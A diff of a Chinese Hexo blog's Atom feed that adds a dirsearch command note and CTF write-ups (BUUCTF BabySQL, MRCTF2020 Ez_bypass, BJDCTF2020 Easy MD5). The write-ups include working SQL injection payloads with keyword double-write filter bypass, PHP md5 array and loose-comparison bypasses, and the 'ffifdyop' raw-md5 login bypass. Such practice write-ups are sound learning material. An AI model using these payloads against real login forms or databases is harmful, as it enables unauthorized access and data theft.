@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-05-23T09:09:56.509Z</updated>
+  <updated>2021-06-06T03:17:20.682Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,13 +17,36 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>CTF工具用法</title>
+    <link href="http://example.com/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/"/>
+    <id>http://example.com/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/</id>
+    <published>2021-06-06T03:16:10.000Z</published>
+    <updated>2021-06-06T03:17:20.682Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>指令：python dirsearch.py -u”127.0.0.1”</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;dirsearch&quot;&gt;&lt;a href=&quot;#dirsearch&quot; class=&quot;headerlink&quot; title=&quot;dirsearch&quot;&gt;&lt;/a&gt;dirsearch&lt;/h1&gt;&lt;p&gt;指令：python dirsearch.py -u”127.0.0.1”&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
     <title>buuctf4</title>
     <link href="http://example.com/2021/05/23/buuctf4/"/>
     <id>http://example.com/2021/05/23/buuctf4/</id>
     <published>2021-05-23T06:43:06.000Z</published>
-    <updated>2021-05-23T09:09:56.509Z</updated>
+    <updated>2021-07-11T01:24:41.485Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>打开容器，发现是一个登入得界面，确定是一道SQL注入题</p><p>先用万能密码尝试一下：<img src="/2021/05/23/buuctf4/image-20210523144707563.png" alt="image-20210523144707563"></p><p>我们看到or并没有起到作用，说明他被过滤了，尝试<strong>双写</strong>绕过：<img src="/2021/05/23/buuctf4/image-20210523144955969.png" alt="image-20210523144955969"></p><p>我们看到登入成功了，尝试union联合注入，但是我们发现服务器过滤了union 和 select，也尝试双写绕过：</p><p>?username=1’%20 uniounionn selecselectt 1%23&amp;password=123</p><p><img src="/2021/05/23/buuctf4/image-20210523145610941.png" alt="image-20210523145610941"></p><p>我们看到成功注入了，但是列数不匹配，增加列数：<img src="/2021/05/23/buuctf4/image-20210523145912955.png" alt="image-20210523145912955"></p><h4 id="开始爆库："><a href="#开始爆库：" class="headerlink" title="开始爆库："></a>开始爆库：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1</code>返回的是默认数据库</p><p><img src="/2021/05/23/buuctf4/image-20210523150044941.png" alt="image-20210523150044941"></p><p>查一下所有数据库：</p><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1</code><img src="/2021/05/23/buuctf4/image-20210523163448632.png" alt="image-20210523163448632"></p><p>感觉flag可能藏在<code>ctf</code>数据库中</p><h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523151431699.png" alt="image-20210523151431699"></p><h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523164546430.png" alt="image-20210523164546430"></p><h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523170907245.png" alt="image-20210523170907245"></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>打开容器，发现是一个登入得界面，确定是一道SQL注入题</p><p>先用万能密码尝试一下：<img src="/2021/05/23/buuctf4/image-20210523144707563.png" alt="image-20210523144707563"></p><p>我们看到or并没有起到作用，说明他被过滤了，尝试<strong>双写</strong>绕过：<img src="/2021/05/23/buuctf4/image-20210523144955969.png" alt="image-20210523144955969"></p><p>我们看到登入成功了，尝试union联合注入，但是我们发现服务器过滤了union 和 select，也尝试双写绕过：</p><p>?username=1’%20 uniounionn selecselectt 1%23&amp;password=123</p><p><img src="/2021/05/23/buuctf4/image-20210523145610941.png" alt="image-20210523145610941"></p><p>我们看到成功注入了，但是列数不匹配，增加列数：<img src="/2021/05/23/buuctf4/image-20210523145912955.png" alt="image-20210523145912955"></p><h4 id="开始爆库："><a href="#开始爆库：" class="headerlink" title="开始爆库："></a>开始爆库：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1</code>返回的是默认数据库</p><p><img src="/2021/05/23/buuctf4/image-20210523150044941.png" alt="image-20210523150044941"></p><p>查一下所有数据库：</p><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1</code><img src="/2021/05/23/buuctf4/image-20210523163448632.png" alt="image-20210523163448632"></p><p>感觉flag可能藏在<code>ctf</code>数据库中</p><h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523151431699.png" alt="image-20210523151431699"></p><h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523164546430.png" alt="image-20210523164546430"></p><h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523170907245.png" alt="image-20210523170907245"></p><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开容器发现一段php代码，整理得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>代码审计可知，我们通过GET获取gg和id两个参数，通过POST获取passwd。</p><p>先来看第一个判断语句：if(  md5($id) === md5($gg) &amp;&amp; $id !== $gg )</p><p>它要求我们两组参数的值要不相等，但md5编码后的值相等</p><p>我们之前有做过md5绕过，弱等于判断，这里可以利用数组绕过md5。因为md5无法编码数组，会返回null。</p><p>构造第一个payload：<code>?id[]=1&amp;gg[]=2</code></p><p>再看第二个判断语句：if (   !is_numeric($passwd)    )<br>                                               if(     $passwd==1234567    )<br>他要求我们POST的参数passwd的值类型不为数字，但是又判断passwd的值是都等于1234567，这里我们可以使用弱等于绕过</p><p>构造第二个payload：<code>password=1234567a</code></p><p>最后，通过hackbar上传我们的payload即可获取flag<img src="/2021/05/23/buuctf4/image-20210710103012191.png" alt="image-20210710103012191"></p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>打开容器，发现就一个查询框，查看源码没发现什么重要的信息。</p><p>随机输入数字1，发现没什么回显，但是看到URL栏跳出passwd=1</p><p>尝试抓包：</p><p><img src="/2021/05/23/buuctf4/image-20210710174945601.png" alt="image-20210710174945601"></p><p>发现回文中藏着hint——将我们输入上传的passwd经过md5编码后带入sql查询语句。</p><p>这里介绍一下md5()函数：</p><p><strong>语法</strong>：<code>md5(string,raw)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要计算的字符串。</td></tr><tr><td><em>raw</em></td><td>可选。规定十六进制或二进制输出格式：  TRUE - 原始 16 字符二进制格式                                                                                                                               FALSE - 默认。32 字符十六进制数</td></tr></tbody></table><p>**sp:**原始二进制数据不是指0101这些二进制数据，而是原始字符串转换成ascii码后组成的字符串。</p><p>关于md5输出原始二进制的转换过程和机制参考博客：<a href="https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/">https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/</a></p><p>我们可以看到提示要求我们输入的passwd经过md5编码后要等于真的密码，但是我们怎么会知道密码呢，那么关键点肯定就是在md5上。通过查阅资料我们得知可以使用<code>ffifdyop</code>绕过，其经过<code>md5(ffifdyop,raw)</code>后为<code>&#39;or&#39;6xxxxxxxxxx</code>；</p><p>带入sql语句中为：<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxxxxx&#39;</code>，也就是说构成了一句用真式。那么这时带入数据库中就不会返回空了。</p><p>输入ffifdyop后跳转到一个新的页面，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里我们用数组绕过md5即可，构造payload：<code>?a[]=a&amp;b[]=b</code>   绕过</p><p>有跳转到另一个页面，又是一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>这里我们依旧采用数组绕过md5即可：<img src="/2021/05/23/buuctf4/image-20210710214847048.png" alt="image-20210710214847048"></p><p>需要注意的是后面一个等号是强等于，那么我们就不能使用哈希碰撞来绕过md5。因为PHP强等于时就不会把以0E开头的哈希值解释为0。</p><p><strong>sp：</strong>最近还做了蛮多md5绕过的题，有一个关于md5绕过的博客写的挺全面的：<a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>]]></content>
     
     
       
@@ -1005,28 +1028,6 @@
   </entry>
   
   <entry>
-    <title>C语言的解题思路</title>
-    <link href="http://example.com/2020/12/24/blog9/"/>
-    <id>http://example.com/2020/12/24/blog9/</id>
-    <published>2020-12-24T08:41:40.000Z</published>
-    <updated>2021-01-30T14:55:36.697Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h6 id="学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。"><a href="#学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。" class="headerlink" title="学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。"></a>学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。</h6><p>1.绝对偏差最小问题。</p><p>【题目】</p><p>输入某班级n(0&lt;n&lt; 100)个学生的成绩到数组a中，查找出所有成绩中与及格线(60分)绝对偏差最小的学生成绩，并输出该学生的成绩。</p><p>【思路】</p><p>先定义一个数组a[100],用for语句算出每一个数与60差的绝对值，然后定义一个变量m去存储最小绝对偏差值，同时用定义变量k去记存当绝对偏差值最小时i的值。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;h6 id=&quot;学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
-    
-  </entry>
-  
-  <entry>
     <title>lesson9、lesson10</title>
     <link href="http://example.com/2020/12/13/blog%20j/"/>
     <id>http://example.com/2020/12/13/blog%20j/</id>
@@ -1091,29 +1092,6 @@
     
     
     <category term="数据库的增删改查" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第六章</title>
-    <link href="http://example.com/2020/12/01/blog8/"/>
-    <id>http://example.com/2020/12/01/blog8/</id>
-    <published>2020-12-01T13:08:21.000Z</published>
-    <updated>2021-01-30T14:55:02.879Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="一-指针与指针变量"><a href="#一-指针与指针变量" class="headerlink" title="一.指针与指针变量"></a>一.指针与指针变量</h4><p>1.指针就是变量的地址。</p><p>2.指针变量的定义：类型标识符   *标识符；如：int   *p。这句话将p定义为指针变量；p代表一个地址。</p><p>注：a.一个指针变量只能指向类型相同的变量。</p><p>​        b.如果存在“int i， *p=&amp;i（定义的p为指针变量的同时将i的地址赋值给p，指针变量p就指向了i，即 *p等价于i）；”。那么 *p等价于i等价于 *&amp;i；&amp; *p等价于&amp;i等价于p。观察发现指针运算符和取地址符共同作用时，会相互抵消。</p><h4 id="二-指针运算"><a href="#二-指针运算" class="headerlink" title="二.指针运算"></a>二.指针运算</h4><p>1.指针运算符“ * ”与自增，自减运算符均为单目运算，运算级相同，则运算方向为自右向东。</p><p>三.指针和二维数组</p><p>1.假设a为二维数组，a既是数组名也是二维数组的首地址，相当于a[0] [0]。a+1表示a[1] [0];*a+1表示a[0] [1]。</p><p>2.假设有程序语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5] , (*p)[5],i,j;</span><br><span class="line">p&#x3D;a;</span><br></pre></td></tr></table></figure><p>则存在以下等阶：<em>（p[i]+j)  等于 * (* (p+i)+j)   等于  (</em>(p+i ) )[j] 等于  p[i] [j] 等于  a[i] [j] 。</p><p>3.假设有程序语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5],i,j,*p[3];</span><br><span class="line">for (i&#x3D;0;i&lt;3;i++) p[i]&#x3D;a[i];&#x2F;&#x2F;p[i] 相当于每一行的首地址</span><br></pre></td></tr></table></figure><p>则存在以下等阶：*(p[i]+j) 等于 *( *(p+i)+j)  等于 ( *(p+i )) [ j ] 等于 p[i] [j] 等于 a[i] [j]。</p><h4 id="三-复合"><a href="#三-复合" class="headerlink" title="三.复合"></a>三.复合</h4><h5 id="1-指向指针的指针变量定义："><a href="#1-指向指针的指针变量定义：" class="headerlink" title="1.指向指针的指针变量定义："></a>1.指向指针的指针变量定义：</h5><p>语法格式：类型标识符   ** 指针变量名。    **指针变量名等阶于 *( *指针变量名)</p><h5 id="2-指向结构体数组的指针变量"><a href="#2-指向结构体数组的指针变量" class="headerlink" title="2.指向结构体数组的指针变量:"></a>2.指向结构体数组的指针变量:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct booktp</span><br><span class="line">&#123;</span><br><span class="line">char name[60];</span><br><span class="line">char author[30];</span><br><span class="line">float price;</span><br><span class="line">struct datetp</span><br><span class="line">&#123;</span><br><span class="line">unsigned year;</span><br><span class="line">unsigned month;</span><br><span class="line">&#125;pubday;</span><br><span class="line">&#125;;</span><br><span class="line">struct booktp *p,book[3];</span><br><span class="line">p&#x3D;book;&#x2F;&#x2F;p指向book的首地址，即book[0];</span><br><span class="line">且book[0].price &#x3D; p-&gt;price &#x3D; (*p).price</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h4 id=&quot;一-指针与指针变量&quot;&gt;&lt;a href=&quot;#一-指针与指针变量&quot; class=&quot;headerlink&quot; title=&quot;一.指针与指针变量&quot;&gt;&lt;/a&gt;一.指针与指针变量&lt;/h4&gt;&lt;p&gt;1.指针就是变量的地址。&lt;/p&gt;
-&lt;p&gt;2.指针变量的定义：类型标识符   *标识符</summary>
-      
-    
-    
-    
-    
-    <category term="C语言学习" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
     
   </entry>
   
@@ -1277,150 +1255,6 @@
     
     
     <category term="MySQL数据库的搭建与启动" scheme="http://example.com/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>第五章汇总（1）</title>
-    <link href="http://example.com/2020/11/09/blog7/"/>
-    <id>http://example.com/2020/11/09/blog7/</id>
-    <published>2020-11-09T11:00:22.000Z</published>
-    <updated>2021-01-30T14:54:28.738Z</updated>
-    
-    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="一-函数"><a href="#一-函数" class="headerlink" title="一.函数"></a>一.函数</h4><p>1.系统运行C语言程序时，从主函数开始计算，当遇到自定义函数时，转到自定义函数进行运算，最后回到主函数完成运算。</p><p>2.非主函数的其他函数之间可以相互调用。一个函数调用另一个函数，前者称为主调函数，后者称为被调函数。</p><p>3.<strong>函数的定义：</strong></p><p>类型标识符 函数名（）</p><p>{</p><p>​     函数体</p><p>}</p><p>4.类型标识符的作用是定义函数体执行完之后，函数返回值的类型。若省略类型标识符，系统默认函数返回值类型为int型。如果函数无返回值，则用void来定义函数的返回值。</p><p>5.函数体一般用return语句来结束，格式如return （表达式）。当程序执行到return语句时，先计算表达式的值，然后程序的流程返回到调用该函数的地方，并将表达式的值作为函数值返回给主调函数。</p><p>6.<strong>函数的参数传递。</strong>a.函数间值传递时，形参的值在被调函数中会改变，而实参的值保持不变。（根本原因是这两者的数据地址不同）</p><p>​                                  b.实参的作用是把函数中的具体数值传递给被调用的函数。且实参个数与顺序要和形参相同，实参和形参对应的数据类型也相同。</p><p>具体使用如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"> void swap(char x,char y)&#x2F;&#x2F;x,y为形参</span><br><span class="line"> &#123;</span><br><span class="line"> char ch;</span><br><span class="line"> ch&#x3D;x;</span><br><span class="line"> x&#x3D;y;</span><br><span class="line"> y&#x3D;ch;</span><br><span class="line"> &#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">char ch1&#x3D;&#39;a&#39;,ch2&#x3D;&#39;b&#39;;</span><br><span class="line">printf(&quot;before:ch1&#x3D;%c ch2&#x3D;%c\n&quot;,ch1,ch2);</span><br><span class="line">swap(ch1,ch2);&#x2F;&#x2F;此处的ch1，ch2都是实参</span><br><span class="line">printf(&quot;after:ch1&#x3D;%c ch2&#x3D;%c\n&quot;,ch1,ch2);</span><br><span class="line">return 0;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>输出的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">before:ch1&#x3D;a ch2&#x3D;b</span><br><span class="line">after:ch1&#x3D;a ch2&#x3D;b</span><br></pre></td></tr></table></figure><h4 id="二-地址传递"><a href="#二-地址传递" class="headerlink" title="二.地址传递"></a>二.地址传递</h4><p><strong>表示地址值的形式有</strong>：<u>数组名</u>（注意是数组名不是数组，如数组a[0]则取不到实参地址），&amp;变量，字符串，指针变量。</p><p>当使用上述方式进行值传递时，可使形参和实参的地址相同。则当形参的值发生改变时，实参的值也随之发生改变，即数据具有双向性。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">double efunn(double a[2]);</span><br><span class="line">double b[2],average;</span><br><span class="line">b[0]&#x3D;15.6;</span><br><span class="line">b[1]&#x3D;b[0]&#x2F;2;</span><br><span class="line">printf(&quot;1--in main:b[0]&#x3D;%3.1f b[1]&#x3D;%3.1f\n&quot;,b[0],b[1]);</span><br><span class="line">average&#x3D;efunn(b);&#x2F;&#x2F;b为数组名</span><br><span class="line">printf(&quot;average&#x3D;%3.1f\n&quot;,average);</span><br><span class="line">printf(&quot;3--in main:b[0]&#x3D;%3.1f b[1]&#x3D;%3.1f\n&quot;,b[0],b[1]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">    double efunn(double a[2])&#x2F;&#x2F;形参数组可不用定义元素个数，但使用形参数组时要注意不能超过实参数组个数，否则会报错。</span><br><span class="line">&#123;</span><br><span class="line">double sum,aver;</span><br><span class="line">sum&#x3D;a[0]+a[1];</span><br><span class="line">a[0]&#x3D;a[0]+2.5;</span><br><span class="line">a[1]&#x3D;a[1]+5.8;</span><br><span class="line">aver&#x3D;sum&#x2F;2;</span><br><span class="line">printf(&quot;2-in function:a[0]&#x3D;%3.1f a[1]&#x3D;%3.1f\n&quot;,a[0],a[1]);</span><br><span class="line">return (aver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1--in main:b[0]&#x3D;15.6 b[1]&#x3D;7.8</span><br><span class="line">2-in function:a[0]&#x3D;18.1 a[1]&#x3D;13.6</span><br><span class="line">average&#x3D;11.7</span><br><span class="line">3--in main:b[0]&#x3D;18.1 b[1]&#x3D;13.6</span><br></pre></td></tr></table></figure><p><strong>二维数组与一维数组的关系：</strong></p><p>a[m] [n] =a[i*n+j]，具体为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (i&#x3D;0;i&lt;m;i++)</span><br><span 